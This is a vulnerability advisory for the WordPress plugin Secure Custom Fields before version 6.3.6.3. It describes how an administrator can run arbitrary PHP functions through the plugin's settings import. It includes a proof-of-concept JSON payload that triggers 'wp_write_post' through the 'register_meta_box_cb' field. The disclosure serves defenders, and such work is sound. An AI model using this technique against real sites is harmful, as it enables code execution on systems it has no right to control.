## WordPress Plugin Vulnerabilities

# Secure Custom Fields < 6.3.6.3 - Admin+ Remote Code Execution

### Description

The plugin does not prevent users from running arbitrary functions through its setting import functionalities, which could allow high privilege users such as admin to run arbitrary PHP functions.

### Proof of Concept

Import the following JSON, wp\_write\_post() will be executed when navigating to /wp-admin/post-new.php?post\_type=demo:
[
{
"key": "post\_type\_demo",
"post\_type": "demo",
"title": "demo",
"active": true,
"\_valid": true,
"labels": {
"name": "demo",
"singular\_name": "demo",
"menu\_name": "demo"
},
"register\_meta\_box\_cb": "wp\_write\_post"
}
]
